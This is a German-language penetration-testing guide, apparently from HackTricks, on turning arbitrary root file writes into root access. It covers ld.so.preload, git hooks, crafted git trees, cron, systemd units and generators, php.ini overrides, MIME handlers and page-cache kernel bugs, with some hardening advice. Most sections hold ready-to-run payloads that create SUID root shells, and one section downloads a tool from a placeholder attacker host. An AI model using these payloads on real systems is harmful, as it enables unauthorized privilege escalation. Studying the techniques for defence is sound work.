# Beliebiges Schreiben in Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste von Shared Objects, die der dynamische Linker vor anderen Shared Objects lädt. Im Secure-Execution-Modus gelten zusätzliche Einschränkungen für das Preloading, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-Binaries.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei einliest, die aufgeführte Bibliothek vor seinen anderen Shared Objects. So lässt sich Code im Kontext dieses Prozesses ausführen.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, etwa bei Commit- und Merge-Vorgängen. Wenn ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen ausführt und ein Angreifer **in den Ordner `.git` schreiben** kann, lässt sich der Hook zur **Privilege Escalation** nutzen.<sup>[[13]](#references)</sup>

Zum Beispiel kann in einem Git-Repo unter **`.git/hooks`** ein **Skript erstellt** werden, das bei jedem neuen Commit ausgeführt wird:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privilegierter Git-tree-Export mit Path Traversal

Ein privilegierter Synchronisierer kann einen Checkout vermeiden und stattdessen ein durch Angreifer beeinflusstes Repository mit `git ls-tree` auflisten, jeden Blob mit `git cat-file` lesen, den gemeldeten Pfad mit einem Staging-Verzeichnis verbinden und die Datei selbst schreiben. Dadurch entsteht ein **arbitrary file write mit den Berechtigungen des Synchronisierers**, wenn dabei `-c safe.directory=*` (deaktiviert die Git-Schutzmaßnahme für Repositories mit anderem Besitzer) mit einer fehlenden Prüfung auf Pfadbegrenzung im Zielverzeichnis kombiniert wird. Ein absoluter Name eines Tree-Eintrags bewirkt, dass Python mit `os.path.join(stage, name)` `stage` verwirft; ein relativer Name mit `../` verlässt das Verzeichnis, sobald das Dateisystem den Pfad auflöst. Da die Anwendung den rohen Tree materialisiert, statt Git mit dem Checkout zu beauftragen, schützt die Ablehnung von Pfaden während des Checkouts das Ziel nicht.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Achte in Root-Diensten, Timern, Deployment-Agenten, Template-Importern und Backup-/Restore-Jobs auf folgendes Code-Muster:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Ein Tree-Eintrag ist wie folgt codiert: `<mode> SP <name> NUL <raw object ID>`. Die Option `git hash-object --literally` erlaubt absichtlich Objektdaten, die bei der normalen Verarbeitung oder durch `git fsck` möglicherweise zurückgewiesen würden. Daher kann ein Wegwerf-Klon einen Tree erstellen, dessen Dateiname ein absolutes Zielverzeichnis ist. Dieses Beispiel erstellt einen Blob mit Cron-Datei, packt den manipulierten Tree in einen Commit und setzt einen Branch darauf. Für die Ausnutzung ist weiterhin die Berechtigung erforderlich, ein von einem privilegierten Job verwendetes Repository zu aktualisieren, sowie ein Git-Server, der das fehlerhafte Objekt akzeptiert.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Die Härtung muss sowohl die Aufnahme von Repositories als auch die abschließende Dateisystemoperation abdecken:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Ersetze `safe.directory=*` durch die exakten Repositories, denen der Dienst vertrauen muss, und verarbeite Repositories, wo möglich, ohne Root-Rechte.
- Weise absolute Namen sowie alle Komponenten `.` oder `..` zurück, bevor Dateien erstellt werden. Kanonisiere nach dem Zusammenfügen den Pfad und überprüfe, dass das Ziel innerhalb des vorgesehenen Stammverzeichnisses bleibt.
- Vermeide Symlink-Rennen durch Prüfen und anschließendes Öffnen: Öffne Pfade relativ zu einem vertrauenswürdigen Verzeichnisdeskriptor und verwende unter Linux für angreifergesteuerte Pfade `openat2()` mit `RESOLVE_BENEATH` und `RESOLVE_NO_SYMLINKS`.
- Bevorzuge einen normalen Checkout in einem isolierten Verzeichnis, statt den Checkout anhand von Plumbing-Ausgaben neu zu implementieren. Wenn die Aufnahme von Raw-Objekten erforderlich ist, aktiviere die Validierung auf der Empfängerseite, etwa mit `receive.fsckObjects=true`; schwäche die pfadbezogenen `receive.fsck.*`-Prüfungen, die zum Zurückweisen manipulierter Trees erforderlich sind, nicht ab.

### Bereitstellung privilegierter Konfigurationen

Manche Verwaltungsdienste speichern den vorgesehenen Systemzustand in einer Konfigurationsdatei und stellen ihn später mit erhöhten Rechten bereit. Beispielsweise speichert [openmediavault seine Konfiguration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), und seine [RPC-Schnittstelle](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) kann Dienständerungen anwenden. Wenn ein Konto mit geringeren Rechten diese Datei schreiben oder ersetzen kann, prüfe, ob es auch eine autorisierte Bereitstellung anfordern kann und ob das ausgewählte Modul das geänderte Feld als Root verarbeitet. SSH-Kontoschlüssel, geplante Befehle und Paketinstallationen haben jeweils unterschiedliche Voraussetzungen; das bloße Vorhandensein einer Datei oder eine beschreibbare XML-Datei beweist nicht, dass eine dieser Möglichkeiten besteht. Prüfe die Berechtigungen der Datei und ihrer übergeordneten Verzeichnisse, die Gruppen des Aufrufers und dessen RPC-Autorisierung, die installierte Version sowie die tatsächliche Verarbeitung, ohne während der Bestandsaufnahme die Konfiguration zu bearbeiten oder einen Anwendevorgang auszulösen.

Fail2Ban-Aktionsdefinitionen unter `/etc/fail2ban/action.d/` bilden eine weitere Grenze für privilegierte Konfigurationen. Ein Benutzer, der in dieses Verzeichnis schreiben und es durchsuchen kann, kann möglicherweise eine Aktionsdefinition ersetzen oder eine Überschreibung hinzufügen. Verzeichnisberechtigungen allein belegen jedoch keine Codeausführung. Stelle sicher, dass ein aktiviertes Jail tatsächlich die betroffene Aktion auswählt, dass der Fail2Ban-Dienst sie mit höheren Rechten ausführt und dass ein autorisiertes Neuladen oder ein Neustart sowie ein passendes Ban-Ereignis stattfinden werden. Eine nicht zusammenhängende sudo-Berechtigung zum Neustart von Fail2Ban ist nur dann relevant, wenn sie für genau den betreffenden Dienstaufruf gilt und die geänderte Definition geladen wird. [Fail2Bans Aktionskonfiguration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) dokumentiert den Zusammenhang zwischen Aktionsverzeichnis und Jail; die [Beispielaktion](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) zeigt, dass `actionban` bei einem Ban mit den Rechten des Dienstbenutzers ausgeführt wird. Prüfe die Berechtigungen und die effektive Konfiguration, ohne während der Bestandsaufnahme Aktionen zu ändern oder Bans auszulösen.

Eine separate Grenze entsteht, wenn ein aktiviertes Fail2Ban-Jail eine WHOIS-angereicherte Mail-Aktion verwendet. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) betraf nicht vertrauenswürdigen WHOIS-Text, der an GNU mailutils `mail` weitergeleitet wurde, dessen Escape-Verarbeitung einen Befehl ausführen konnte. Ein Benutzer mit geringeren Rechten, der Dateien schreiben kann, kann die Antwort möglicherweise beeinflussen, wenn er die Konfiguration zur Serverüberschreibung des **ausgewählten WHOIS-Clients** ändern kann; [Debians `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentiert eine solche Datei, doch Pfad und Verwendung unterscheiden sich je nach Installation. Prüfe das effektive Jail und die Aktion, die Dienstidentität, den tatsächlich verwendeten WHOIS-Client und dessen Konfigurationspfad, die Mail-Implementierung, die Möglichkeit zur Kontrolle der Antwort sowie den installierten Fix oder Backport des Anbieters. Eine beschreibbare WHOIS-Konfigurationsdatei, eine Fail2Ban-Version oder eine Mail-Aktion allein belegt diese Angriffskette nicht; vermeide während einer passiven Bestandsaufnahme Abfragen an externe Server oder das Auslösen von Bans.

### TFTP-Dateierstellung und privilegierte Paket-Hooks

Ein erreichbarer TFTP-Dienst kann eine Container- oder lokale Benutzergrenze überschreiten, wenn seine **effektiven** tftpd-hpa-Einstellungen ihn als Root ausführen, das Dateisystem-Root als `--secure`-Verzeichnis freigeben und `--create` aktivieren. [Das tftpd-hpa-Handbuch](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) beschreibt die Optionen zum Erstellen von Dateien und zur Festlegung des Benutzers. Damit kommt das Erstellen einer neuen Datei in einem privilegierten Konfigurationsverzeichnis infrage, darunter `/etc/apt/apt.conf.d/`; eine vorhandene Datei lässt sich möglicherweise trotzdem nicht ersetzen. [Das APT-Konfigurationshandbuch](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentiert Befehle für `APT::Update::Pre-Invoke`. Ein als Root ausgeführtes `apt update` kann zum Prozess mit höheren Rechten werden, **aber nur, wenn** es die neue Konfigurationsdatei einliest. Prüfe die tatsächlichen Argumente und die Identität des laufenden Daemons, die Netzwerkerreichbarkeit und Filterung, die Richtlinien zum Erstellen von Dateien im Zielverzeichnis, den effektiven Geltungsbereich der APT-Konfiguration sowie einen späteren privilegierten Aufruf. Eine Standarddatei, ein beschreibbares Zielverzeichnis oder ein geplanter APT-Befehl allein belegt nicht den gesamten Angriffsweg. Bei einer passiven Triage sollten nur begrenzte lokale Konfigurationen und Metadaten gelesen werden, ohne eine Datei hochzuladen oder APT aufzurufen.

### Cron- und Zeitdateien

Wenn du **Cron-Dateien schreiben kannst, die von Root ausgeführt werden**, kannst du in der Regel Code ausführen, sobald der Job das nächste Mal startet. Interessante Ziele sind:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Roots eigene Crontab unter `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen gestarteten Dienste

Schnellprüfungen:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typische Missbrauchswege:

- **Einen neuen root-cronjob anhängen** an `/etc/crontab` oder eine Datei in `/etc/cron.d/`
- **Ein Skript ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Ein vorhandenes Timer-Ziel backdooren**, indem das Skript oder die Binärdatei geändert wird, die es startet

Minimales cron-Payload-Beispiel:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Wenn du nur in ein von `run-parts` verwendetes cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notizen:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher vorzugsweise Namen wie `backup` statt `backup.sh`.<sup>[[15]](#references)</sup>
- Manche Systeme verwenden `systemd`-Timer statt klassischem cron, aber die Idee des Missbrauchs ist dieselbe: **ändern, was root später ausführt**.<sup>[[20]](#references)</sup>

### Dienst- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder darin referenzierte Dateien schreiben kannst, kannst du möglicherweise Code als root ausführen, indem du die Unit neu lädst und neu startest oder wartest, bis die Dienst-/Socket-Aktivierung ausgelöst wird.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Prüfe auch Schreib- und Suchzugriff auf das System-Unit-Verzeichnis selbst, einschließlich ACLs: Ein Benutzer kann eine neue Unit in `/etc/systemd/system` erstellen, selbst wenn das Lesen/Auflisten des Verzeichnisses verweigert wird. Dieser Pfad allein startet nichts. Stelle sicher, dass der Systemmanager die neue Unit lädt, dass der Aufrufer eine effektive root-fähige `systemctl start`- oder `restart`-Berechtigung für ihren Namen (oder einen anderen privilegierten Aktivierungspfad) hat und dass der Dienst unter der vorgesehenen Identität ausgeführt wird. Eine geänderte vorhandene, geladene Unit erfordert möglicherweise `daemon-reload`; für eine neu benannte Unit gelten andere Ladebedingungen. Prüfe die genauen sudo-Argumente und Ausschlüsse, bevor du eine Wildcard-Regel für Neustarts als ausreichend ansiehst. Siehe den [systemd-Unit-Suchpfad](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) und die [Ladesemantik und Reload-Semantik von systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Dienstskripte/-Binärdateien, auf die über `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwiesen wird
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Dienst geladen werden

Schnellprüfungen:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer root-eigenen Service-Unit, die du ändern kannst
- **Einen Drop-in-Override hinzufügen** mit einem bösartigen `ExecStart=` und zuvor den alten Eintrag löschen
- **Das Skript/Programm manipulieren**, auf das die Unit bereits verweist
- **Einen socket-aktivierten Dienst hijacken**, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, wenn der Socket eine Verbindung empfängt

Beispiel für einen bösartigen Override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typischer Aktivierungsablauf:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Wenn du Dienste nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Clientverbindung warten**, um die Ausführung des Backdoor-Dienstes als root auszulösen.<sup>[[17]](#references)</sup>

### systemd-Generatorverzeichnisse

**Systemgeneratoren** sind ausführbare Dateien, die vom Systemmanager gestartet werden, bevor er Unit-Dateien lädt – sowohl beim Booten als auch beim Neuladen der Konfiguration. Schreibzugriff auf ein Systemgeneratorverzeichnis (oder auf einen vorhandenen ausführbaren Generator) ermöglicht daher direkt die Ausführung von Code als root. Dies wird leicht übersehen, wenn bei einer Überprüfung nur `*.service`- und `*.timer`-Dateien berücksichtigt werden.<sup>[[35]](#references)[[36]](#references)</sup>

Die übliche Suchreihenfolge lautet `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` und `/usr/lib/systemd/system-generators/` (einige Distributionen stellen `/lib/systemd/system-generators/` über die `/usr`-Zusammenführung bereit). Eine ausführbare Datei mit demselben Namen in einem früheren Verzeichnis überschattet die spätere. Verwechsle diese **Eingabeverzeichnisse für ausführbare Dateien** nicht mit `/run/systemd/generator`, `/run/systemd/generator.early` und `/run/systemd/generator.late`, die temporäre, von Generatoren erzeugte Unit-Ausgaben enthalten.<sup>[[35]](#references)</sup>

Schnellprüfungen:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Ein neu erstellter Generator muss mit gesetztem Ausführungsbit versehen werden. Wenn das Schreibprimitiv zwar Bytes, aber nicht den Modus steuern kann, ziele auf einen bereits ausführbaren Generator; ihn direkt zu kürzen, erhält normalerweise seine Metadaten. Ist das Verzeichnis selbst beschreibbar, erstelle einen neuen Eintrag und setze dessen Ausführungsbit.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Das Ausführen von `systemctl daemon-reload` für den **system**-Manager erfordert eine entsprechende Autorisierung, führt aber alle systemweiten Generatoren erneut aus; andernfalls muss man auf einen Reload mit privilegierten Rechten, einen Paketvorgang oder einen Neustart warten. User-Generator-Verzeichnisse wie `~/.config/systemd/user-generators/` werden vom User-Manager ausgeführt und verschaffen **nicht** von sich aus Root-Rechte.<sup>[[35]](#references)</sup>

Zur Härtung und Suche nach Angriffsspuren solltest du jede Pfadkomponente und ACL prüfen, nicht nur die Berechtigungsbits der Datei, Hashes und Paketzugehörigkeit der Generatoren als Baseline erfassen und bei Erstellung, Umbenennung, Inhalts- oder Berechtigungsänderungen in allen Eingabeverzeichnissen der Systemgeneratoren Alarm auslösen. Die Schreibvorgänge zu überwachen ist wichtig, da sich ein einmalig ausgeführter Generator nach dem Ausführen selbst löschen kann, während der generierte Unit-Baum unter `/run/systemd/generator*` beim nächsten Reload neu erstellt wird.<sup>[[35]](#references)[[36]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-sandbox verwendet wird

Manche benutzerdefinierten Daemons validieren von Benutzern bereitgestellten PHP-Code, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel mit `disable_functions=exec,system,...`). Wenn der Code in der sandbox trotzdem über **irgendeine Schreibprimitive** verfügt (wie `file_put_contents`) und du den **genauen Pfad zur `php.ini`** erreichen kannst, die der Daemon verwendet, kannst du **diese Konfiguration überschreiben**, die Einschränkungen aufheben und anschließend eine zweite Payload übermitteln, die mit erhöhten Rechten ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Die erste Payload überschreibt die sandbox-Konfiguration.
2. Die zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den Pfad durch den vom Daemon verwendeten Pfad):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Wenn der Daemon als root läuft (oder Pfade mit root-Eigentümer prüft), ergibt die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen **Privilege Escalation durch Überschreiben der Konfiguration**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung verknüpft ein Dateitypmuster mit einem Interpreter. Die Auswirkungen auf die Berechtigungen hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Prüfe daher diese Voraussetzungen, bevor du dies als möglichen Privilege-Escalation-Pfad einstufst.<sup>[[21]](#references)</sup>

Ein ausführbarer Helper mit `CAP_DAC_OVERRIDE` kann einen separaten Registrierungsweg darstellen, wenn er vom Aufrufer kontrollierte Daten entgegennimmt und in `/proc/sys/fs/binfmt_misc/register` schreibt, selbst wenn der Aufrufer diesen Knoten nicht direkt beschreiben kann. Prüfe die Eingaben und das Schreibverhalten des Helpers, ohne ihn bei der Bestandsaufnahme auszuführen. Wenn eine registrierte Regel das Flag `C` verwendet, erhält der Interpreter Berechtigungen auf Grundlage der passenden Binärdatei; ein passendes SUID-Programm im Besitz von root kann daher einen vom Aufrufer kontrollierten Interpreter als root ausführen. Prüfe den `binfmt_misc`-Mount und die Registrierungsrichtlinien, die effektive Capability des Helpers, die exakte Regel und den Interpreter-Pfad, das ausführbare SUID-Ziel sowie, ob `no_new_privs` oder ein `nosuid`-Mount den SUID-Wechsel unterdrückt. Ein Capability-Bit oder ein eingebetteter Pfad-String allein ist lediglich ein Ansatzpunkt für eine Prüfung.<sup>[[21]](#references)</sup> Siehe [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) zu Bedingungen, unter denen SUID unterdrückt wird.

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Einträge, um eine Anwendung für URI-Schemata auszuwählen. Ein Angreifer, der die betreffenden Konfigurations- und Desktop-Eintragsverzeichnisse des Benutzers beschreiben kann, kann diese Schemata zu einem von ihm kontrollierten Launcher umleiten. Indem die Datei `$HOME/.config/mimeapps.list` so geändert wird, dass HTTP- und HTTPS-URLs von einer bösartigen Datei behandelt werden (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Klick des Benutzers diesen Desktop-Eintrag aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root führt benutzerbeschreibbare Skripte/Binärdateien aus

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` (oder eine beliebige Binärdatei in einem Verzeichnis ausführt, das einem unprivilegierten Benutzer gehört), kannst du ihn hijacken:<sup>[[1]](#references)</sup>

- **Ausführung erkennen:** Überwache Prozesse mit pspy, um zu erkennen, wenn Root benutzerkontrollierte Pfade aufruft.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören oder für ihn beschreibbar sind.
- **Ziel hijacken:** Sichere die ursprüngliche Binärdatei/das ursprüngliche Skript und lege einen Payload ab, der eine SUID-Shell erstellt (oder eine andere root-Aktion ausführt). Stelle anschließend die Berechtigungen wieder her:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den hijackten Pfad erneut ausführt, die erweiterte Shell mit `./rootshell -p` übernehmen.

### Änderung privilegierter Binärdateien nur im Page-Cache

Manche Kernel-Bugs verändern die Datei **auf der Festplatte** nicht. Stattdessen ermöglichen sie Änderungen ausschließlich an der **Page-Cache-Kopie** einer lesbaren Datei. Wenn du eine **setuid**- oder anderweitig von **root ausgeführte** Binärdatei angreifen kannst, kann die nächste Ausführung angreifergesteuerte Bytes aus dem Speicher ausführen und die Rechte erweitern, obwohl der Datei-Hash auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Nützlich ist es, sich das als **Laufzeit-Schreibprimitive für Dateien** vorzustellen:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt unverändert**: Der Inode und die Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Seite lesen oder ausführen, erhalten den vom Angreifer geänderten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Verdrängung aus dem Cache

Dieses Primitive liegt zwischen klassischem **arbitrary file write** und älteren Bugs zur **Page-Cache-Ausnutzung** wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW beruhte auf einer Race Condition
- Dirty Pipe unterlag Einschränkungen bei der Schreibposition
- Ein reines Page-Cache-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe auf gecachte, dateigestützte Seiten ermöglicht

#### Allgemeiner privesc-Ablauf

1. Ein Kernel-Primitive beschaffen, das Schreibzugriffe auf **dateigestützte Page-Cache-Seiten** ermöglicht
2. Es gegen eine **lesbare privilegierte Binärdatei** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **auslösen, bevor die Seite aus dem Cache verdrängt wird**
4. Codeausführung als root erreichen, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binärdateien
- Helper, die von **root-Diensten** gestartet werden
- Binärdateien, die häufig aus **Containern mit gemeinsam genutztem Host-Kernel/Page-Cache** ausgeführt werden

#### Beispielpfad mit AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad lag in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Seiten aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- Der In-Place-Entschlüsselungspfad von `algif_aead` verwendete Quell- und Zielpuffer wieder
- `authencesn` schrieb anschließend in den Ziel-Tag-Bereich
- Wenn dieser Bereich weiterhin auf gespleißte, dateigestützte Seiten verwies, landete der Schreibzugriff im **Page-Cache der Zieldatei**

Die interessante Technik ist also nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Seiten in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als **beschreibbare Ausgabe** zu behandeln
- eine kleine, kontrollierte Änderung im Speicher auslösen

Der öffentliche PoC nutzte wiederholte **4-Byte-Schreibzugriffe**, um `/usr/bin/su` im Speicher zu patchen, und führte die Datei anschließend aus.<sup>[[4]](#references)[[7]](#references)</sup>

#### Beispielpfad mit ESP / XFRM + netfilter-TEE-Klon

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **Page-Cache-only-Schreibzugriff-zu-root-Musters**, diesmal jedoch mit **IPsec-ESP-Entschlüsselung** statt `AF_ALG` als Senke.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die entscheidende Technik ist der **Metadaten-Laundering-Schritt**:

- `splice()` fügt eine **schreibgeschützte, dateigestützte Page-Cache-Seite** in ein ESP-in-UDP-Paket ein
- Die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Entschlüsseln **eine Kopie erstellt**
- Netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Der Klon behält dieselbe physische Page-Cache-Referenz, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Klon daraufhin als sicher und führt eine **In-Place-Entschlüsselung mit `cbc(aes)`** auf der dateigestützten Seite aus

Die allgemeine Lehre für Reviewer geht über die CVE hinaus: Wenn eine Mitigation anhand von **skb-/Seitenmetadaten** entscheidet, ob zuerst eine Kopie erstellt werden muss, kann jeder **Klon- oder Kopierpfad, der die zugrunde liegende Seite beibehält, aber die Metadaten verwirft**, das Schreibprimitive unbemerkt wieder ermöglichen.

Typischer Ablauf der Ausnutzung:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ausführen, um **`CAP_NET_ADMIN` innerhalb eines privaten Network Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. Jedes 4-Byte-Zielwort im SA-Feld `seq_hi` kodieren (DirtyFrags Trick zur Wortauswahl)
5. Das gespleißte ESP-in-UDP-Paket senden, sodass der **TEE-Klon** `esp_input()` erreicht und **In-Place** entschlüsselt wird
6. Wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei angreifergesteuerten Code enthält

In der Praxis ist die Auswirkung dieselbe wie beim `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt unverändert, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und verschafft root-Rechte.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Prüfungen auf eine mögliche Anfälligkeit für diese Variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

